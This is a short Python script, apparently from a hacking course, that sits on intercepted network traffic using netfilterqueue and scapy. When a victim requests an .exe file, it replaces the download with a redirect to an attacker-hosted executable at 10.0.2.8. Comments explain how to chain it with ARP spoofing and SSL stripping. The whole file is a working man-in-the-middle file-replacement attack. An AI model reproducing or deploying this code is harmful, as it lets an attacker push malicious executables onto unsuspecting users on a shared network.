#!/usr/bin/env python
import netfilterqueue
import scapy.all as scapy

# service apache2 start to start the web server
# first run the spoofer
# second run the ssl strip
# then configure the traffic in and out (kali)
# run the modified file interceptor


ack_list = []


def set_load(packet, load):
    packet[scapy.Raw].load = load
    del packet[scapy.IP].len
    del packet[scapy.IP].chksum
    del packet[scapy.TCP].chksum
    return packet


def process_packet(packet):
    scapy_packet = scapy.IP(packet.get_payload())
    if scapy_packet.haslayer(scapy.Raw):
        if scapy_packet[scapy.TCP].dport == 8080:
            # print("HTTP Request")
            # any of the if code below will transform the program to python 3
            if b".exe" in scapy_packet[scapy.Raw].load and b"http://10.0.2.8/putty.exe" not in scapy_packet[scapy.Raw].load:
                # if ".exe" in scapy_packet[scapy.Raw].load.decode():
                print("[+] exe Request")
                ack_list.append(scapy_packet[scapy.TCP].ack)
                # print(scapy_packet.show())
        elif scapy_packet[scapy.TCP].sport == 8080:
            # print("HTTP response")
            if scapy_packet[scapy.TCP].seq in ack_list:
                ack_list.remove(scapy_packet[scapy.TCP].seq)
                print("[+] Replacing file")
                # you can use your files in the location below
                modified_packet = set_load(scapy_packet,
                                           "HTTP/1.1 301 Moved Permanently\nLocation: http://10.0.2.8/putty.exe\n\n")
                # print(scapy_packet.show())

                # set payload method epxects a bytes object not a string as below

                # packet.set_payload(str(modified_packet))

                # the correct one
                packet.set_payload(bytes(modified_packet))

    packet.accept()


queue = netfilterqueue.NetfilterQueue()
queue.bind(0, process_packet)
queue.run()



